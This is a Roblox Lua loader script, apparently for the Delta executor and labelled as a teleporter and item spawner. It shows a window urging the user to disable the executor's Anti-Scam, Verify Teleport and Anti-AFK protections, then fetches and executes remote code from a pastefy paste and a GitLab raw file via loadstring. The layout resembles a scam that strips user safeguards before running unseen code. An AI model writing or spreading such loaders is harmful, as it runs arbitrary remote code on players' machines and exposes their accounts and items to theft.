-- Loader.lua
-- Warning GUI + Teleporter + Spawner

--// Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

--// Remove old GUI if exists
if PlayerGui:FindFirstChild("DeltaWarningGUI") then
    PlayerGui:FindFirstChild("DeltaWarningGUI"):Destroy()
end

--// Warning GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "DeltaWarningGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = PlayerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 400, 0, 220)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 14)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -16, 0, 40)
title.Position = UDim2.new(0, 8, 0, 8)
title.BackgroundTransparency = 1
title.Text = "⚠ Turn off all on Delta settings ⚠"
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextColor3 = Color3.fromRGB(255, 85, 85)
title.Parent = mainFrame

local info = Instance.new("TextLabel")
info.Size = UDim2.new(1, -16, 0, 120)
info.Position = UDim2.new(0, 8, 0, 50)
info.BackgroundTransparency = 1
info.Text = "1. Disable Anti-AFK\n2. Disable Verify Teleport\n3. Disable Anti-Scam\n\n✅ After disabling, press OK to continue."
info.TextColor3 = Color3.fromRGB(220,220,220)
info.TextXAlignment = Enum.TextXAlignment.Left
info.TextYAlignment = Enum.TextYAlignment.Top
info.TextSize = 16
info.Font = Enum.Font.Gotham
info.Parent = mainFrame

local okBtn = Instance.new("TextButton")
okBtn.Size = UDim2.new(0, 160, 0, 40)
okBtn.Position = UDim2.new(0.5, -80, 1, -55)
okBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 85)
okBtn.Text = "Okay"
okBtn.TextColor3 = Color3.fromRGB(255,255,255)
okBtn.TextSize = 18
okBtn.Font = Enum.Font.GothamBold
okBtn.Parent = mainFrame
Instance.new("UICorner", okBtn).CornerRadius = UDim.new(0, 10)

--// When OK clicked, destroy warning & run scripts
okBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()

    -- Step 1: Run TP script
    loadstring(game:HttpGet("https://pastefy.app/ESqWIOfA/raw"))()

    -- Step 2: Run Spawner script
    local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
    Spawner.Load()
end)
